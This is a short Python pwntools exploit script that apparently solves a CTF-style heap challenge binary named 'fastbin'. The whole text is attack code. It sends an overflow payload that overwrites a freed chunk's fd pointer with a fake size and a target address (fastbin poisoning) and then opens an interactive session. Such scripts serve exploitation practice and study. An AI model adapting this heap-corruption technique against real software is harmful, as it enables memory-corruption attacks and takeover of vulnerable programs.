# coding:utf-8

from pwn import *

pwn = process("./fastbin")

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

# overwrite chunk1's fd, make it equal 0x29

payload = 'a'*32 + p64(0) + p64(0x31) + p64(0x601050-8)

pwn.send(payload)

pwn.interactive()